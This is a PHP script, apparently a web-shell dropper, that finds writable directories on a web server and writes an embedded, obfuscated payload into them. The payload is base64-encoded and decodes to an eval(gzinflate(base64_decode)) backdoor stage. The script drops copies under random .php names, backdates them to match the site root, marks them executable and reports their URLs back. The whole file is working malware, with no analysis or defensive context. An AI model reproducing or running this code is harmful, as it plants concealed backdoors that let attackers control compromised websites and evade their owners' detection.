<?php if(!defined("PHP_EOL"))
{
    define("PHP_EOL", "\n");
}

if(!defined("DIRECTORY_SEPARATOR"))
{
    define("DIRECTORY_SEPARATOR", "/");
}

function generateRandomString($length = 10)
{
    $characters = '0123456789abcdefghijklmnopqrstuvwxyz';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString . ".php";
}

$payload_file = "PD9waHANCg0KDQpldmFsKCJcblwkZGdyZXVzZGkgPSBpbnR2YWwoX19MSU5FX18pICogMzM3OyIpOw0KDQokYSA9ICI3VmRyVCtOR0ZQMWVxZjloaUNJY0t3SEZqN0NsSVFoMkJkMVY2Ykl0aFZaQzFKbzRrMlFTdnpSMjY3NHJhRi85NHpEazc4R0xPb3U1VzZVbzJNN1psenozM01uVHMzSnp6Z1RzeVNsc2E2NzRDSVhqaFJPdFE5NWZYMXpvL1crL0liaE9OZ2pNT1NrcUJxUmJuZmZwdmNQdW1idEllQmc0Q2ZkWkFRZE1PdWg0M09kSks1MlFmM0t5U2FOSWg2NzR2cXhXUkF6dkZnL1d4cUhBcEczU2xwTlowM2w1Yy92anNqTkNaTk53em5uRGxod0FiSDJVZXlDdlcxekYvclI0VTVoOXp3cHlDZkJuVENoTU9ESlUrb3REK0hocElpT2s4cG1COHU0Uk5MNjc0aVphenBERzdNQjJSc3dOUjZ5MVJlb2RsWklzTnZMYXZ2Njc0eHlVdHVKM0p1eVd1SXdNeHpESS9yMThkTjVCYUJtN3JDZmNuRkhKOGx0RlVOa1dESlFnU2taSHZqK3ZTbm4yK004T0pzOHZyaStqUitlMllZVjcrdlRqOWNlZTl2Yms1N2I2NVhaeGZYaHZIREw5N2s5Vy9uNzk0Mk1tK3FCc0FaRm95Y09CNjc0OG1NU3BjL2hHU05ZanRTWTlBY2tmR2JLc1FZWnFweEtySEY2NzR1ZXo1Y1h2MzZsRHNCeUlhTFJPYU9ZREdqd3AzV2g3bVlRUm0rWHdTVlJPcnlLVk5jeUtkL0w2ZXFsdFhtbHNKeGVaVnpMSTIrbXI0Mi9YdzZaMDY4R1BvOGp2SGRha1lzakR6V2tRSHhQRG9NQlUyWVl1Y2lYR011L0xWdkRIRnBOQXB4dzlyQ0dUN285a21USHlGQlBMWWgxL3YxQzdxV202VnlzNDFjM2hheXU2dWlCTHpkaHRtODNmNTA1SnJzUG1HQmROaUpxS0ErN0EvRktDTzdiZkk3SFhtZER1VlUzelpuZDNvbE85VGhLSS9zNjc0M2NxV21XOTVYeDRMS3hZZGNzVlNaVWJEdXVJZXI5Tm8xdU56alc0OC9CQWRscWx2VjZzUFIyaWpjWkx5bWNSRzlNWlcwWGpHVDJjejY3NGFUV2NnbWZEYUs0bkEwR3pOTjE4bGdRQ29hbnEvdXAwTFFqNjFjRlpJUGhyT2tJaGF2ZUpJV2hid0M4SmVXMGNYR0l3M2UrRjZ4R2xRcXF5aXRRbTYxYUtuZEFYZ1NUYU1sNjc0K2tPZUE0ZXIrR2FzZC9kTXpRRmtMblRVSjZtZ2xPUC95a0xnaFJVVWFvMjc5b25wdktKSVJDRmtJeTB1NWZRNWpLSzNlTmszK1p2dFJZVVMxdHpSQk9LRFRWbkgydlBnSk5Gc1BVMWRnVmpRYUdZNUNnS0IxQkZ0VUlXN3c0Njc0NVVHNjc0TjVtaWloVERGTmFqVXNRMnNsOG80ZnVLemFoU21qZTI5c0F0bnhrOGlCYUp3cmZoWWp4bUlpdXRtK0ZrNkcxU3U3aitlMGJuYysvL0FPR0JXZnEyT3FTSHNaNTgyaVhDWGcrREI3aGY0ZjRPOXk2NzQ2NzR1cmcvb1FRUS9EZExiTkJnZ3dQaUhRSkM4SUhPa0ZpQURkaGdBRzY3NEFZZ0JqQUdRQVpRQm1ISmFZVEFpWlVnTzY3NFRBaVo2NzRESjc5ZmFZSUROQlpvTE1oRktyV3pZTklBdGtGc2dza0ZrZ3N5QmtRY2lDa0FVaEcwcHQ0R3pnYk9rTGNEWndObkQycXhLaERTNjc0YlFqMEk5YjdhWlBtZjhLc2oxRlY5SWlwYTJpbVNJNUkxZHV1eTJDZDZwZWNmcG1oRjc0elNlSnMyYmFsczJzYmRrWjJCVktyc0FpVlJqZFF1NmQ2Zm4rdms2QWdidkw1TGs1ZnNZcFQwYTY3NFVWSjdUOG9jR0RCYXVTbHR3TUZuNmRvNXkwaVZHSlZkb1pWN3hwR3krSUF2NDlrSllpRm12cGZEUk1aWU02NzRZeXZlVmx6YTJHNisxSGJ6czJ3M1M3WWZmQUhUclplYWJyM1k5RHJoSjh2L3NjMnJLZmNZNkdVaUhaT3UyZ3czM1FQREoyVmRYRG81UHNicHBsTDcxSkxzRDlJZk02N1N0QzY3NGlQU0RsUFpOWnZiZjMvR2FTTVI0UVc5M0JaaitEMW1aa0RkYmYiOw0KJGEgPSBzdHJfcmVwbGFjZSgkZGdyZXVzZGksICJFIiwgJGEpOw0KZXZhbCAoZ3ppbmZsYXRlKGJhc2U2NF9kZWNvZGUoJGEpKSk7";
$payload_name = "";

srand(time());

/////////////////////////////////////////////////////////
function comparer($a, $b)
{
    return strlen($a)-strlen($b);
}

if (!function_exists('file_put_contents')) {
    function file_put_contents($filename, $data) {
        $f = @fopen($filename, 'w');
        if (!$f) {
            return false;
        } else {
            $bytes = fwrite($f, $data);
            fclose($f);
            return $bytes;
        }
    }
}

function GetPathDiff($base_path, $full_path)
{
    $pos = strpos($full_path, $base_path);

    if ($pos === FALSE)
    {
        return FALSE;
    }

    return substr($full_path, $pos + strlen($base_path));
}

function GetWritableDirs()
{
    $res = Array();

    $analysys_queue = Array();

    $analysys_queue[] = GetDocRoot();

    $self_path = $_SERVER['SCRIPT_FILENAME'];
    while (($slash = strrpos($self_path, DIRECTORY_SEPARATOR)) !== FALSE)
    {
        $self_path = substr($self_path, 0, $slash);

        if ($self_path == GetDocRoot())
        {
            break;
        }

        if (strlen($self_path))
        {
            $analysys_queue[] = $self_path;
        }
    }

    foreach ($analysys_queue as $current_dir)
    {
        if (!in_array($current_dir, $res))
        {
            $res = array_merge($res, GetDirectoryList($current_dir));
        }
    }
    $res = array_merge($analysys_queue, $res);

    return CheckWritable(array_unique($res));
}

function CheckWritable($dir_list)
{
    $dir_list_writable = Array();

    foreach ($dir_list as $dir)
    {
        if (@is_writable($dir) == TRUE)
        {
            $dir_list_writable[] = $dir;
        }
    }

    return $dir_list_writable;
}

function GetDirectoryList($dir, $depth=1000)
{

    $result = array();
    $dir_count = 0;

    if ($depth == 0)
    {
        return $result;
    }

    $dir = strlen($dir) == 1 ? $dir : rtrim($dir, '\\/');
    $h = @opendir($dir);
    if ($h === FALSE)
    {
        return $result;
    }

    while (($f = readdir($h)) !== FALSE)
    {
        if ($f !== '.' and $f !== '..')
        {
            $current_dir = "$dir/$f";
            if (is_dir($current_dir))
            {
                $dir_count += 1;

                if ($dir_count >= $depth)
                {
                    break;
                }

                $result[] = $current_dir;
                $result = array_merge($result, GetDirectoryList($current_dir, $depth / 10));
            }
        }
    }

    closedir($h);

    return $result;
}

function GetDocRoot()
{
    $docroot_end = strrpos($_SERVER['SCRIPT_FILENAME'], $_SERVER['REQUEST_URI']);
    if ($docroot_end === FALSE)
    {
        return $_SERVER['DOCUMENT_ROOT'];
    }
    elseif ($docroot_end === 0)
    {
        return "/";
    }
    else
    {
        return substr($_SERVER['SCRIPT_FILENAME'], 0, $docroot_end);
    }
}

function GetPayload($payload)
{
    $current_payload = base64_decode($payload);

    return $current_payload;
}

function WritePayload($path, $payload)
{
    if (!file_exists($path))
    {
        if (file_put_contents($path, GetPayload($payload)) != FALSE)
        {
            return TRUE;
        }

    }

    return FALSE;
}

////////////////////////////////////////////////////////////////////////////////////////////

# get base local and remote path
$base_www_path = $host = @$_SERVER['HTTP_HOST'];
$base_local_path = GetDocRoot();

if (!($base_local_path_time = @stat($base_local_path."/.htaccess")))
{
    if (!($base_local_path_time = @stat($base_local_path."/index.php")))
    {
        if (!($base_local_path_time = @stat($base_local_path."/index.html")))
        {
            if (!($base_local_path_time = @stat($base_local_path."/..")))
            {
                if (!($base_local_path_time = @stat($base_local_path)))
                {
                    $base_local_path_time = Array();
                    $base_local_path_time['mtime'] = time();
                }
            }
        }
    }
}

$base_local_path_time = $base_local_path_time['mtime'];

$dir_list_writable = GetWritableDirs();

if (count($dir_list_writable) == 0)
{
    echo "URL#STATUS_UNWRITABLE";
    exit();
}

usort($dir_list_writable, 'comparer'); # sort directory by len

$list_writable = Array();
$list_writable[] = $dir_list_writable[0];
$list_writable[] = $dir_list_writable[rand(0,sizeof($dir_list_writable))];
$good = FALSE;
$good_counter = 0;
# try to upload
$max_tryes = strlen($payload_name) == 0 ? 5 : 1;
foreach ($list_writable as $current_dir)
{
    // if payload name is set, no more one try to upload on current dir
    //for ($i=0; $i < $max_tryes; $i++)
    {
        if (strlen($payload_name) == 0)
        {
            $temp_payload_name = generateRandomString();
        }
        else
        {
            $temp_payload_name = $payload_name;
        }

        $full_payload_name = $current_dir . DIRECTORY_SEPARATOR . $temp_payload_name;

        $uri_path = GetPathDiff($base_local_path, $full_payload_name);
        $full_uri = $base_www_path . (strpos($uri_path, "/") == 0 ? $uri_path : "/".$uri_path);

        if (WritePayload($full_payload_name, $payload_file))
        {
            touch($full_payload_name, $base_local_path_time); // set last modification time as root folder
            chmod($full_payload_name, 0755);
            echo "URL#http://" . $full_uri . PHP_EOL;
            $good=TRUE;
            $good_counter++;
            if ($good_counter >1)
            {
                //unlink("dfaonfpfkwg.php");
                echo "#CCCURL";
                exit();
            }
        }
    }
}
if(!$good)
    echo "URL#STATUS_CANTUPLOAD#CCCURL";
echo "#CCCURL";
//unlink("dfaonfpfkwg.php");
exit();